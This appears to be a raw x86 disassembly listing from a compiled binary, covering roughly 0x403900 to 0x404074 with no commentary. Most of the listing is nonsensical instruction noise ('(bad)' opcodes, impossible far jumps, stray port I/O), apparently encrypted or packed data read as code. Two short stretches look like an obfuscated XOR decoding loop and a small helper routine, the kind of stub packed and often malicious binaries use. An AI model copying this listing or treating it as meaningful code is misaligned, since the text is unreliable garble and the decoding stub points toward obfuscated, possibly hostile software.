  403900:	cdq    
  403901:	lods   al,BYTE PTR ds:[esi]
  403902:	dec    ebx
  403903:	push   eax
  403904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403905:	inc    ebp
  403906:	repnz (bad) 
  403908:	stos   DWORD PTR es:[edi],eax
  403909:	and    al,0x63
  40390b:	pop    edi
  40390c:	mov    eax,0x817a2e8b
  403911:	test   BYTE PTR [esi-0x30],0xd0
  403915:	dec    edx
  403916:	or     BYTE PTR [ecx+0xd],ch
  403919:	mov    WORD PTR [ecx],?
  40391b:	rcr    DWORD PTR [eax+ecx*8-0x6a],0x3d
  403920:	outs   dx,BYTE PTR ds:[esi]
  403921:	pop    es
  403922:	jo     0x40397a
  403924:	int3   
  403925:	sar    esi,cl
  403927:	adc    ecx,esp
  403929:	dec    ebp
  40392a:	xchg   edi,eax
  40392b:	mov    BYTE PTR [ebx+0x56825402],bh
  403931:	and    esi,DWORD PTR [ecx-0x4f]
  403934:	repz inc ebx
  403936:	rcr    DWORD PTR [ebx-0x71],cl
  403939:	mov    dl,0x49
  40393b:	or     al,BYTE PTR [ebx+0x292e1a9]
  403941:	jge    0x403958
  403943:	xchg   ebp,ecx
  403945:	pusha  
  403946:	mov    ecx,0xd4aac0b6
  40394b:	loopne 0x403979
  40394d:	imul   ebx,DWORD PTR [esi+eax*4-0x362409b8],0x9cfbad86
  403958:	jl     0x403911
  40395a:	xor    ecx,DWORD PTR [edi+0x4c]
  40395d:	stos   BYTE PTR es:[edi],al
  40395e:	xchg   esi,eax
  40395f:	and    al,0x82
  403961:	push   eax
  403962:	jle    0x40393c
  403964:	mov    cl,0x3c
  403966:	and    ebx,ebp
  403968:	xor    dl,BYTE PTR [edi]
  40396a:	sub    eax,0x10478296
  40396f:	int    0x2b
  403971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403972:	jo     0x4038fe
  403974:	dec    edx
  403975:	ja     0x4039d1
  403977:	jmp    0x7ba7:0xea5be451
  40397e:	retf   
  40397f:	mov    al,0x63
  403981:	in     al,dx
  403982:	das    
  403983:	repnz mov edx,0xbad63930
  403989:	ffree  st(7)
  40398b:	scas   eax,DWORD PTR es:[edi]
  40398c:	fcom   QWORD PTR [esi+0x51b20b9c]
  403992:	inc    eax
  403993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403994:	mov    eax,ds:0xdbdd4af7
  403999:	and    al,BYTE PTR [ecx-0x1a]
  40399c:	pusha  
  40399d:	pop    ebx
  40399e:	call   0xee60:0xe5c945fb
  4039a5:	mov    ecx,0xcc40d86c
  4039aa:	nop
  4039ab:	aam    0x74
  4039ad:	jb     0x40392f
  4039af:	fld    TBYTE PTR [ebp+0x479f9f46]
  4039b5:	push   edx
  4039b6:	das    
  4039b7:	dec    esi
  4039b8:	loop   0x4039cc
  4039ba:	mov    ch,0xf7
  4039bc:	shl    BYTE PTR [edi-0x11],0xaa
  4039c0:	mov    al,ds:0xbb7999c9
  4039c5:	cmp    cl,dl
  4039c7:	inc    esi
  4039c8:	mov    esp,0x4f8dcead
  4039cd:	aam    0x60
  4039cf:	out    0xa7,al
  4039d1:	jg     0x4039cf
  4039d3:	stc    
  4039d4:	mul    DWORD PTR [ebp-0x78]
  4039d7:	cmp    al,0x6e
  4039d9:	add    DWORD PTR [ecx+eiz*1-0x64f3fc17],ebp
  4039e0:	inc    eax
  4039e2:	xchg   esi,eax
  4039e3:	shl    esp,1
  4039e5:	mov    WORD PTR [edx],ds
  4039e7:	jmp    0x4804:0xe0de700f
  4039ee:	cmp    al,0xd9
  4039f0:	cmp    edi,edx
  4039f2:	xor    al,0x70
  4039f4:	js     0x403a27
  4039f6:	adc    al,0x6c
  4039f8:	popa   
  4039f9:	cmp    edx,edx
  4039fb:	mov    bh,BYTE PTR [ecx+0x20]
  4039fe:	icebp  
  4039ff:	outs   dx,BYTE PTR ds:[esi]
  403a00:	sub    eax,0x662f4503
  403a05:	xchg   ebp,eax
  403a06:	mov    esp,edx
  403a08:	sub    al,0x56
  403a0a:	inc    ebp
  403a0b:	rol    BYTE PTR [ebx+0x71ffacd5],1
  403a11:	aam    0xc
  403a13:	adc    DWORD PTR [ebx+ebp*1],0xaf165b62
  403a1a:	icebp  
  403a1b:	daa    
  403a1c:	mov    bh,al
  403a1e:	aas    
  403a1f:	call   0x9977e600
  403a24:	enter  0x7c53,0xff
  403a28:	(bad)  
  403a2a:	gs in  al,0x3a
  403a2d:	xchg   ebp,eax
  403a2e:	sub    BYTE PTR [ebx+0x4a9f0957],0x70
  403a35:	xchg   DWORD PTR [edx-0x268672a5],ebp
  403a3b:	mov    edx,0xae6ab3f3
  403a40:	sti    
  403a41:	mov    bh,0x9c
  403a43:	(bad)  
  403a45:	rcl    dl,cl
  403a47:	stos   BYTE PTR es:[edi],al
  403a48:	or     ebx,ecx
  403a4a:	scas   al,BYTE PTR es:[edi]
  403a4b:	or     eax,DWORD PTR [ecx+0x2e]
  403a4e:	gs jns 0x4039dc
  403a51:	jge    0x403a4f
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	and    esp,ebp
  403a66:	mov    bh,0xd3
  403a68:	gs push ds
  403a6a:	jl     0x403ae8
  403a6c:	ins    DWORD PTR es:[edi],dx
  403a6d:	jg     0x403aeb
  403a6f:	jl     0x403aed
  403a71:	mov    edi,DWORD PTR [eax+ebp*8-0x7990f5f9]
  403a78:	and    DWORD PTR [edi-0x7e339623],ebx
  403a7e:	sahf   
  403a7f:	mov    al,ds:0xe0512ef1
  403a84:	add    edi,edi
  403a86:	enter  0xf559,0x35
  403a8a:	sahf   
  403a8b:	out    dx,al
  403a8c:	enter  0x5cd3,0x70
  403a90:	rcl    BYTE PTR [esp+eiz*2+0x2b],1
  403a94:	xor    al,0xb6
  403a96:	xor    cl,BYTE PTR [edx]
  403a98:	push   ecx
  403a99:	dec    eax
  403a9a:	in     eax,dx
  403a9b:	sar    BYTE PTR [edi],cl
  403a9d:	into   
  403a9e:	stc    
  403a9f:	inc    esp
  403aa0:	fbstp  TBYTE PTR [edx]
  403aa2:	xchg   esp,eax
  403aa3:	inc    esi
  403aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa5:	mov    edx,0x576f4402
  403aaa:	ins    DWORD PTR es:[edi],dx
  403aab:	dec    eax
  403aac:	jmp    0x403a3b
  403aae:	in     al,0x95
  403ab0:	xor    al,0xd0
  403ab2:	dec    BYTE PTR [esi-0x5d]
  403ab5:	fnop   
  403ab7:	not    DWORD PTR ds:0x4091b33b
  403abd:	push   eax
  403abe:	xchg   BYTE PTR [eax+0x1c],cl
  403ac1:	lds    ecx,FWORD PTR [eax]
  403ac3:	push   ecx
  403ac4:	push   eax
  403ac5:	mov    ah,0xd9
  403ac7:	pop    es
  403ac8:	pop    eax
  403ac9:	shl    dh,cl
  403acb:	scas   eax,DWORD PTR es:[edi]
  403acc:	fmulp  st(7),st
  403ace:	outs   dx,BYTE PTR ds:[esi]
  403acf:	sub    eax,0xaf6137cb
  403ad4:	(bad)  
  403ad5:	test   cl,ch
  403ad7:	cmc    
  403ad8:	and    al,0xc9
  403ada:	sti    
  403adb:	in     al,0x54
  403add:	loop   0x403a78
  403adf:	stc    
  403ae0:	les    ebx,FWORD PTR [edx]
  403ae2:	scas   al,BYTE PTR es:[edi]
  403ae3:	add    BYTE PTR [esi+0x4c5a04fe],0x8a
  403aea:	mov    esp,0x53e9d4f6
  403aef:	inc    edx
  403af0:	xor    ebx,DWORD PTR [ebp-0x581a384f]
  403af6:	std    
  403af7:	inc    eax
  403af8:	cdq    
  403af9:	arpl   WORD PTR [esi-0x398639e6],si
  403aff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b00:	jp     0x403aba
  403b02:	jle    0x403b80
  403b04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b05:	icebp  
  403b06:	ret    
  403b07:	jns    0x403b78
  403b09:	adc    dl,BYTE PTR [esi+0x29]
  403b0c:	maskmovq mm7,mm0
  403b0f:	fisub  DWORD PTR [edi+0x5]
  403b12:	xchg   edx,eax
  403b13:	dec    ecx
  403b14:	pusha  
  403b15:	cmp    al,0xdf
  403b17:	xchg   esi,eax
  403b18:	(bad)  [edx-0x4f]
  403b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b1c:	lahf   
  403b1d:	out    0x29,al
  403b1f:	outs   dx,BYTE PTR ds:[esi]
  403b20:	xor    cl,bh
  403b22:	out    0xb1,eax
  403b24:	and    esi,DWORD PTR [ecx]
  403b26:	lods   eax,DWORD PTR ds:[esi]
  403b27:	or     DWORD PTR [eax+ebp*4-0x32a141d5],ecx
  403b2e:	push   0x55fbd798
  403b33:	in     al,0xd6
  403b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b36:	scas   eax,DWORD PTR es:[edi]
  403b37:	push   ebx
  403b38:	clc    
  403b39:	sar    eax,1
  403b3b:	jp     0x403b62
  403b3d:	mov    DWORD PTR [edx-0x3c],edx
  403b40:	jl     0x403b77
  403b42:	inc    esp
  403b43:	xchg   ecx,eax
  403b44:	pop    ss
  403b45:	jb     0x403ba6
  403b47:	push   ebp
  403b48:	push   es
  403b49:	arpl   WORD PTR [ecx+eax*2+0x1a1b568c],bx
  403b50:	je     0x403b08
  403b52:	jmp    edx
  403b54:	test   BYTE PTR [eax+0x1afd1ac5],0x44
  403b5b:	xor    DWORD PTR [ecx+ebx*1],0x1f
  403b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b60:	leave  
  403b61:	repz popf 
  403b63:	or     BYTE PTR [edx],al
  403b65:	les    eax,FWORD PTR [ebp+0x651ca73]
  403b6b:	xchg   DWORD PTR ds:0xf912a80f,eax
  403b71:	xsha256 (bad)
  403b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b73:	push   ebx
  403b74:	sti    
  403b75:	lods   al,BYTE PTR ds:[esi]
  403b76:	enter  0xaead,0xf1
  403b7a:	std    
  403b7b:	cdq    
  403b7c:	pop    esp
  403b7d:	dec    esp
  403b7e:	mov    eax,ds:0xadafa998
  403b83:	push   esp
  403b84:	addr16 adc al,0x26
  403b87:	add    al,0x46
  403b89:	imul   DWORD PTR [ebx]
  403b8b:	int3   
  403b8c:	js     0x403bdb
  403b8e:	jns    0x403bc9
  403b90:	add    edx,ebx
  403b92:	sub    BYTE PTR [ecx+edx*4],dl
  403b95:	and    BYTE PTR [ecx],0xbb
  403b98:	nop
  403b99:	add    al,0x1b
  403b9b:	les    eax,FWORD PTR [ecx+0x52]
  403b9e:	and    al,0x16
  403ba0:	xor    eax,0xb485a0be
  403ba5:	out    dx,al
  403ba6:	pop    ebx
  403ba7:	adc    edi,DWORD PTR [edi-0x69]
  403baa:	push   edx
  403bab:	and    eax,edx
  403bad:	fwait
  403bae:	jo     0x403c06
  403bb0:	xchg   bx,ax
  403bb2:	or     DWORD PTR [esi],0xfffffffe
  403bb5:	push   eax
  403bb6:	lods   eax,DWORD PTR ds:[esi]
  403bb7:	stos   DWORD PTR es:[edi],eax
  403bb8:	push   edi
  403bb9:	xchg   DWORD PTR [ecx],edi
  403bbb:	xchg   ebp,eax
  403bbc:	xchg   bx,ax
  403bbe:	push   es
  403bbf:	jg     0x403bf1
  403bc1:	aaa    
  403bc2:	mov    dl,0x98
  403bc4:	scas   al,BYTE PTR es:[edi]
  403bc5:	test   BYTE PTR [edx-0x116a31c1],0x14
  403bcc:	and    al,0x1
  403bce:	push   cs
  403bcf:	jecxz  0x403c46
  403bd1:	inc    BYTE PTR [ebp+0x71]
  403bd4:	dec    edi
  403bd5:	clc    
  403bd6:	xor    al,0x18
  403bd8:	mov    al,ds:0x3c2c6b34
  403bdd:	push   ebp
  403bde:	cmp    ecx,esi
  403be0:	push   eax
  403be1:	and    DWORD PTR [esp+ebp*2-0x26],ebp
  403be5:	and    ecx,DWORD PTR [esp+esi*4]
  403be8:	jns    0x403c2e
  403bea:	rcr    DWORD PTR [esi-0x67b1ceaf],0x14
  403bf1:	sbb    ah,cl
  403bf3:	jmp    0x7533:0x53041873
  403bfa:	mov    ebp,eax
  403bfc:	push   ss
  403bfd:	inc    ebx
  403bfe:	dec    esp
  403bff:	inc    eax
  403c00:	push   0xffffffaf
  403c02:	loop   0x403c57
  403c04:	adc    eax,0xba7816c2
  403c09:	adc    BYTE PTR [edi+0x41],0x77
  403c0d:	into   
  403c0e:	dec    edi
  403c0f:	dec    edi
  403c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c11:	sub    al,BYTE PTR [edx+0x2b]
  403c14:	add    BYTE PTR [esi],bl
  403c16:	fcom   DWORD PTR [ebp-0x563d8c48]
  403c1c:	add    DWORD PTR [eax-0x6a],ebx
  403c1f:	imul   BYTE PTR ds:0xe9d94b3c
  403c25:	fisubr DWORD PTR [eax+ebx*8+0x18916e91]
  403c2c:	test   al,0x52
  403c2e:	in     eax,dx
  403c2f:	pop    ss
  403c30:	xchg   edi,eax
  403c31:	cwde   
  403c32:	mov    esp,edi
  403c34:	mov    ebp,0x143462d5
  403c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c3a:	xchg   ecx,eax
  403c3b:	mov    ds:0x86e9c64f,eax
  403c40:	cmp    ch,BYTE PTR ds:0xf802b56f
  403c46:	stos   BYTE PTR es:[edi],al
  403c47:	enter  0x9121,0x82
  403c4b:	fnstcw WORD PTR [eax+0x61edf72e]
  403c51:	lea    ebx,[ebx]
  403c53:	fsub   st(5),st
  403c55:	sub    ecx,DWORD PTR [ebx]
  403c57:	add    al,0xf0
  403c59:	pop    ebp
  403c5a:	mov    esi,0xd6c442f9
  403c5f:	xor    edi,ecx
  403c61:	add    edi,esi
  403c63:	mov    esi,DWORD PTR [ebp+0x8]
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0x4ead197
  403ca4:	or     eax,0x7c7c184a
  403ca9:	ins    DWORD PTR es:[edi],dx
  403caa:	jg     0x403d28
  403cac:	jl     0x403cf9
  403cae:	(bad)  
  403cb0:	add    esp,edi
  403cb2:	les    edx,FWORD PTR [ebp+eiz*2-0x2dcdacc4]
  403cb9:	add    bl,bl
  403cbb:	jl     0x403c65
  403cbd:	cmc    
  403cbe:	mov    ebp,0xdeb093c7
  403cc3:	pop    edx
  403cc4:	xchg   ebp,eax
  403cc5:	daa    
  403cc6:	sbb    dl,BYTE PTR [esi*8-0x17b72047]
  403ccd:	add    DWORD PTR [eax-0x79f177c6],0xffffffca
  403cd4:	dec    esp
  403cd5:	pusha  
  403cd6:	xchg   edi,eax
  403cd7:	je     0x403d2f
  403cd9:	pop    esi
  403cda:	lock jae 0x403cc7
  403cdd:	jmp    0xa130ec85
  403ce2:	cmp    ebp,edi
  403ce4:	into   
  403ce5:	inc    ecx
  403ce6:	sahf   
  403ce7:	clc    
  403ce8:	outs   dx,DWORD PTR ds:[esi]
  403ce9:	lock cwde 
  403ceb:	adc    DWORD PTR [ecx+0x7c],ebp
  403cee:	stos   BYTE PTR es:[edi],al
  403cef:	lea    esp,[edi+0x4fd9b410]
  403cf5:	jnp    0x403d16
  403cf7:	in     al,dx
  403cf8:	sbb    eax,0xb0e2634c
  403cfd:	xchg   ebx,eax
  403cfe:	adc    DWORD PTR [ebp+0x1bca55d5],edi
  403d04:	push   cs
  403d05:	pushf  
  403d06:	push   edx
  403d07:	inc    eax
  403d08:	rcl    BYTE PTR [ebp-0x68374586],cl
  403d0e:	mov    edx,0x198075c8
  403d13:	mov    ds:0xd691baa7,eax
  403d18:	clc    
  403d19:	stos   DWORD PTR es:[edi],eax
  403d1a:	shl    ebp,0xf
  403d1d:	jle    0x403d1f
  403d1f:	aad    0x5a
  403d21:	jae    0x403d93
  403d23:	jmp    0x3954:0xa6cbe1bd
  403d2a:	sub    esp,edi
  403d2c:	cmp    bl,BYTE PTR [edi-0x6301fe74]
  403d32:	lods   eax,DWORD PTR ds:[esi]
  403d33:	sub    edi,DWORD PTR [ebp-0x2e]
  403d36:	mov    cl,0x3e
  403d38:	cmp    al,0x56
  403d3a:	sahf   
  403d3b:	imul   edi,DWORD PTR [edx-0x71],0xffffff99
  403d3f:	lahf   
  403d40:	jae    0x403d73
  403d42:	ret    0x36c7
  403d45:	xor    edx,esp
  403d47:	add    dl,BYTE PTR [eax]
  403d49:	sbb    bh,bl
  403d4b:	sbb    al,0xef
  403d4d:	aas    
  403d4e:	test   BYTE PTR [edi+0x6b],0x7
  403d52:	ror    DWORD PTR es:0x6a35e3d,cl
  403d59:	ss es inc ebp
  403d5c:	mov    ebp,?
  403d5e:	aam    0x45
  403d60:	adc    edi,ebx
  403d62:	jmp    0x89307493
  403d67:	retf   0xe105
  403d6a:	add    BYTE PTR [ebp+0x7a5006eb],ah
  403d70:	sbb    al,BYTE PTR [esi]
  403d72:	int3   
  403d73:	inc    ebp
  403d74:	ins    BYTE PTR es:[edi],dx
  403d75:	js     0x403d66
  403d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d78:	cmp    al,0x53
  403d7a:	(bad)  
  403d7b:	popf   
  403d7c:	mov    bh,0x1e
  403d7e:	adc    cl,BYTE PTR [edx+0x38025752]
  403d84:	sbb    bh,al
  403d86:	js     0x403dae
  403d88:	icebp  
  403d89:	cmc    
  403d8a:	repnz mov eax,ds:0x4527b67c
  403d90:	stos   BYTE PTR es:[edi],al
  403d91:	div    DWORD PTR [ebp-0x50]
  403d94:	ret    0xe640
  403d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d98:	push   ss
  403d99:	and    ecx,ebp
  403d9b:	ins    BYTE PTR es:[edi],dx
  403d9c:	push   ebx
  403d9d:	ins    BYTE PTR es:[edi],dx
  403d9e:	push   ss
  403d9f:	mov    gs,WORD PTR [esi-0x17]
  403da2:	adc    al,0x34
  403da4:	shl    BYTE PTR [esi],0xcd
  403da7:	jns    0x403da1
  403da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403daa:	dec    esp
  403dab:	and    eax,0x238db0cc
  403db0:	pop    ecx
  403db1:	test   BYTE PTR [esi+0x253e9943],al
  403db7:	pop    es
  403db8:	aad    0xaa
  403dba:	popf   
  403dbb:	xchg   DWORD PTR [edi],esi
  403dbd:	pop    ebx
  403dbe:	rcr    DWORD PTR [ecx+0x4ba2c570],cl
  403dc4:	fxch   st(5)
  403dc6:	stos   BYTE PTR es:[edi],al
  403dc7:	and    DWORD PTR [ebx-0x55],0x65
  403dcb:	push   0xffffff92
  403dcd:	in     al,dx
  403dce:	in     al,0xa0
  403dd0:	ror    BYTE PTR [esi],0xab
  403dd3:	pop    esp
  403dd4:	imul   DWORD PTR [esi]
  403dd6:	into   
  403dd7:	mov    bh,0x8d
  403dd9:	mov    es,WORD PTR [ebp-0x7b71c276]
  403ddf:	retf   
  403de0:	in     al,dx
  403de1:	cmp    ecx,DWORD PTR [ecx+0x5c600ab7]
  403de7:	in     al,dx
  403de8:	sub    dl,dl
  403dea:	mov    DWORD PTR [ebx+0x51],esp
  403ded:	and    ch,BYTE PTR [ebp+edi*4+0x692b866c]
  403df4:	xchg   esi,eax
  403df5:	push   ebx
  403df6:	fistp  WORD PTR [ebx+0x37471b0f]
  403dfc:	int3   
  403dfd:	stc    
  403dfe:	aas    
  403dff:	xor    BYTE PTR [edi+ecx*2+0x597eeb4d],dl
  403e06:	jg     0x403dc0
  403e08:	(bad)  
  403e09:	rcl    eax,cl
  403e0b:	jno    0x403e17
  403e0d:	es dec esi
  403e0f:	inc    esp
  403e10:	cs popf 
  403e12:	fld    QWORD PTR ds:[edx+edx*8+0x6bdd78cb]
  403e1a:	xchg   esp,eax
  403e1b:	imul   ebx,edx,0xffffffc4
  403e1e:	adc    DWORD PTR [ebx+0x53c100],edx
  403e24:	cmp    dh,BYTE PTR [ebp+0x145429b9]
  403e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e2b:	(bad)  
  403e2c:	xchg   edi,eax
  403e2d:	jmp    0x58ca18a7
  403e32:	stos   DWORD PTR es:[edi],eax
  403e33:	jle    0x403e57
  403e35:	lods   al,BYTE PTR ds:[esi]
  403e36:	aam    0x57
  403e38:	jo     0x403e9c
  403e3a:	leave  
  403e3b:	cmp    DWORD PTR [edi-0x23af3d48],ebx
  403e41:	jg     0x403e5d
  403e43:	gs cwde 
  403e45:	jle    0x403e73
  403e47:	push   esi
  403e48:	gs int3 
  403e4a:	cwde   
  403e4b:	les    edx,FWORD PTR [ecx]
  403e4d:	loop   0x403e77
  403e4f:	in     al,0xac
  403e51:	fwait
  403e52:	or     BYTE PTR [esi-0x23],ah
  403e55:	js     0x403e88
  403e57:	ins    BYTE PTR es:[edi],dx
  403e58:	pusha  
  403e59:	mov    dl,BYTE PTR [edx+0x34]
  403e5c:	cld    
  403e5d:	in     eax,dx
  403e5e:	ror    BYTE PTR [edi],0x39
  403e61:	or     cl,BYTE PTR ds:0x6a67035b
  403e67:	lea    ebp,[edx]
  403e69:	ins    BYTE PTR es:[edi],dx
  403e6a:	daa    
  403e6b:	push   esi
  403e6c:	mov    bh,0x8a
  403e6e:	adc    BYTE PTR [edx+0x3a94ad3f],0xff
  403e75:	mov    al,ds:0xa9d3e32a
  403e7a:	popa   
  403e7b:	test   eax,0xf992310c
  403e80:	sete   ch
  403e83:	xchg   edx,eax
  403e84:	data16 xor BYTE PTR ds:0x15ae048b,cl
  403e8b:	repz fucomi st,st(4)
  403e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e8f:	xor    al,0x36
  403e91:	scas   al,BYTE PTR es:[edi]
  403e92:	mov    BYTE PTR es:[ebx],dh
  403e95:	stc    
  403e96:	adc    DWORD PTR [edi-0x2b],0x7d
  403e9a:	pop    ebx
  403e9b:	jmp    FWORD PTR [ebx]
  403e9d:	lock add esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0x8ada3cfe
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403f29
  403ee7:	cs xchg edx,eax
  403ee9:	ins    DWORD PTR es:[edi],dx
  403eea:	fild   QWORD PTR [esi]
  403eec:	call   0x6809de82
  403ef1:	(bad)  
  403ef2:	mov    bh,0xcf
  403ef4:	or     BYTE PTR [ebx-0x7f0db449],ah
  403efa:	xchg   ecx,eax
  403efb:	and    dl,bh
  403efd:	fidiv  WORD PTR [edi]
  403eff:	ins    BYTE PTR es:[edi],dx
  403f00:	xchg   DWORD PTR [ebp+edx*4+0x55],edi
  403f04:	dec    ecx
  403f05:	fcom   QWORD PTR [ebp+0x71289d10]
  403f0b:	push   es
  403f0c:	pusha  
  403f0d:	ffree  st(4)
  403f0f:	repz mov ecx,0x99604ed3
  403f15:	pop    ebp
  403f16:	pop    edx
  403f17:	jg     0x403f01
  403f19:	sbb    eax,edx
  403f1b:	adc    al,dh
  403f1d:	mov    ecx,0x62b29292
  403f22:	lea    edi,[ecx]
  403f24:	mov    edx,0x347923c
  403f29:	adc    ecx,DWORD PTR [ecx]
  403f2b:	mov    dl,0xb9
  403f2d:	mov    eax,0x934038bb
  403f32:	xor    eax,0xb8e339b2
  403f37:	loopne 0x403f1e
  403f39:	jge    0x403fa2
  403f3b:	adc    BYTE PTR [edi],ch
  403f3d:	mov    ds:0x18948527,eax
  403f42:	leave  
  403f43:	mov    ds,WORD PTR [edx+0x294a4c26]
  403f49:	scas   al,BYTE PTR es:[edi]
  403f4a:	jmp    0x403f83
  403f4c:	xor    DWORD PTR [esi-0x50],edi
  403f4f:	cs mov esi,0xafc8a17e
  403f55:	xlat   BYTE PTR ds:[ebx]
  403f56:	xchg   ebx,eax
  403f57:	cmp    DWORD PTR [edx-0x1c97d831],esi
  403f5d:	mov    WORD PTR [ebx],ss
  403f5f:	jns    0x403f3a
  403f61:	mov    ah,0x71
  403f63:	mov    ah,0xa5
  403f65:	xchg   esi,eax
  403f66:	xchg   ebx,eax
  403f67:	repnz fld TBYTE PTR [ecx]
  403f6a:	xchg   ebx,eax
  403f6b:	ffreep st(3)
  403f6d:	icebp  
  403f6e:	fwait
  403f6f:	stos   DWORD PTR es:[edi],eax
  403f70:	out    0x9f,eax
  403f72:	hlt    
  403f73:	fsubr  QWORD PTR [esi+esi*2-0x52]
  403f77:	add    edi,DWORD PTR [ebx-0x39]
  403f7a:	jl     0x403fb4
  403f7c:	mov    eax,0xf5898584
  403f81:	pop    ds
  403f82:	fucomip st,st(7)
  403f84:	js     0x403ff8
  403f86:	(bad)  
  403f87:	sbb    ch,BYTE PTR [ecx]
  403f89:	mov    esi,0x11c5641d
  403f8e:	or     eax,0xb73f920f
  403f93:	aas    
  403f94:	mov    ds:0x2554f0a9,al
  403f99:	xor    al,0x3f
  403f9b:	lea    ebp,[eax+ebp*1+0x36]
  403f9f:	cdq    
  403fa0:	je     0x403f90
  403fa2:	stos   DWORD PTR es:[edi],eax
  403fa3:	sub    eax,0xb968d91c
  403fa8:	xchg   edi,eax
  403fa9:	(bad)  [edi-0x76]
  403fac:	ret    0x2027
  403faf:	sbb    bl,ch
  403fb1:	iret   
  403fb2:	cmp    esp,ecx
  403fb4:	xlat   BYTE PTR ds:[ebx]
  403fb5:	cld    
  403fb6:	ret    0xf9bb
  403fb9:	xchg   BYTE PTR [edx-0x12e49340],ch
  403fbf:	nop
  403fc0:	sub    eax,0xb0261c3c
  403fc5:	test   al,0x56
  403fc7:	and    al,0xd2
  403fc9:	dec    edx
  403fca:	fbld   TBYTE PTR ds:0x4bd540a0
  403fd0:	push   es
  403fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fd2:	xchg   ecx,eax
  403fd3:	js     0x403f6b
  403fd5:	or     al,0x87
  403fd7:	or     ecx,ecx
  403fd9:	mov    al,0xf9
  403fdb:	imul   ebp,DWORD PTR [edx],0xffffff8b
  403fde:	pop    es
  403fdf:	pushf  
  403fe0:	pop    esi
  403fe1:	mov    ah,0xb
  403fe3:	cmp    eax,0xcf8eaf63
  403fe8:	mov    dh,0xa7
  403fea:	cli    
  403feb:	(bad)
  403fee:	dec    eax
  403fef:	pop    es
  403ff0:	and    cl,BYTE PTR [edi]
  403ff2:	or     esp,DWORD PTR [ebp+0x34]
  403ff5:	ins    BYTE PTR es:[edi],dx
  403ff6:	(bad)  
  403ff7:	ins    BYTE PTR es:[edi],dx
  403ff8:	jae    0x40403a
  403ffa:	jmp    0x7b66:0x2964ae91
  404001:	daa    
  404002:	fdivr  QWORD PTR [ecx+0x7a8bccb0]
  404008:	addr16 jl 0x40402c
  40400b:	mov    ebx,ecx
  40400d:	sbb    BYTE PTR [esi],0x73
  404010:	sbb    ch,al
  404012:	sti    
  404013:	call   0x41a1:0x1c35cc44
  40401a:	xchg   esi,eax
  40401b:	mov    edi,0xceb7bd23
  404020:	fst    DWORD PTR [esi-0x13]
  404023:	call   0x54e5:0x5489d597
  40402a:	pop    edx
  40402b:	mov    ds:0xdf264c79,eax
  404030:	adc    BYTE PTR [esi+0x56],dl
  404033:	pop    ss
  404034:	cmp    bh,BYTE PTR [ecx-0x19c2da7f]
  40403a:	retf   0x476b
  40403d:	adc    DWORD PTR [edx+eiz*2+0x2ecb74a],edx
  404044:	inc    ebp
  404045:	jp     0x404087
  404047:	dec    ebp
  404048:	test   BYTE PTR [edx+esi*8],ah
  40404b:	or     ebx,DWORD PTR [ebp-0x1dc29fd]
  404051:	fucomi st,st(7)
  404053:	das    
  404054:	fmul   DWORD PTR [esi]
  404056:	(bad)  
  404057:	call   0xaa34:0x1599799b
  40405e:	aad    0x97
  404060:	mov    bl,0xd5
  404062:	push   edx
  404063:	or     ch,BYTE PTR [ebx+0x27]
  404066:	sbb    edi,ebx
  404068:	cmp    bl,BYTE PTR [ecx-0x63]
  40406b:	jb     0x40409e
  40406d:	sar    DWORD PTR [esi+0x43f85d01],0x3d
  404074:	lahf   
